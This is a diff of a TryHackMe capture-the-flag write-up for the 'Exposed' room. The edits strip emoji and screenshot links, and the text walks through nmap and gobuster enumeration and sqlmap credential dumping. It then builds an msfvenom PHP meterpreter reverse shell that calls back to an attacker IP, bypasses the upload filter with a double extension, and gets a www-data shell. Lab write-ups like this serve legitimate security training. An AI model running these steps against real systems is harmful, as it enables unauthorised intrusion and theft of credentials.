@@ -1,6 +1,6 @@
 # Exposed | TryHackMe Write-up
 
-## 📝 Overview
+##  Overview
 
 **Room:** Exposed  
 **Difficulty:** Easy  
@@ -8,7 +8,7 @@
 
 ---
 
-## 🔍 Enumeration
+##  Enumeration
 
 ### Nmap
 
@@ -18,8 +18,7 @@ Quick port scan:
 nmap -sC -sV -oN nmap_initial.txt <IP>
 ```
 
-*Screenshot of quick Nmap scan:*  
-![Nmap Quick Scan](screenshots/nmap_quick.png)
+
 
 Full port scan:
 
@@ -27,8 +26,7 @@ Full port scan:
 nmap -p- -oN nmap_full.txt <IP>
 ```
 
-*Screenshot of full Nmap scan:*  
-![Nmap Full Scan](screenshots/nmap_full.png)
+
 
 **Found:**
 - HTTP on port 1337  
@@ -44,20 +42,17 @@ Directory fuzzing on the web server:
 gobuster dir -u http://<IP>:1337/ -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -x php,txt,html
 ```
 
-*Screenshot of Gobuster:*  
-![Gobuster](screenshots/gobuster.png)
 
 **Discovered directories:** `/admin_101`, `/phpMyAdmin`, `/admin`, `/javascript`
 
 ---
 
-## 💉 SQL Injection
+##  SQL Injection
 
 Login to `/admin_101` through the login form.  
 Intercept the request via Burp Suite and save it as `expose.req`.
 
-*Burp Suite screenshot:*  
-![Burp Suite](screenshots/burp_login.png)
+
 
 ### SQLMap
 
@@ -67,8 +62,7 @@ Check for SQL vulnerability:
 python3 sqlmap.py -r expose.req --dump
 ```
 
-*SQLMap screenshot:*  
-![SQLMap](screenshots/sqlmap_dump.png)
+
 
 **Database credentials found:**
 - Email: `hacker@root.thm`  
@@ -78,7 +72,7 @@ Use them to log in to the site.
 
 ---
 
-## 🐚 File Upload Shell Access
+##  File Upload Shell Access
 
 Create a PHP reverse shell using msfvenom:
 
@@ -88,8 +82,7 @@ msfvenom -p php/meterpreter/reverse_tcp LHOST=10.11.146.237 LPORT=4444 -o exploi
 
 Rename the file to `exploit.php.jpg` to bypass upload filters and upload it via the web form.
 
-*File upload screenshot:*  
-![File Upload](screenshots/file_upload.png)
+
 
 URL to trigger the shell:
 
@@ -110,14 +103,13 @@ set LPORT 4444
 run
 ```
 
-*Meterpreter session screenshot:*  
-![Meterpreter](screenshots/meterpreter.png)
+
 
 Reverse shell obtained with `www-data` privileges.
 
 ---
 
-## 🔐 Privilege Escalation
+##  Privilege Escalation
 
 ### Accessing user `zeamkish`
 
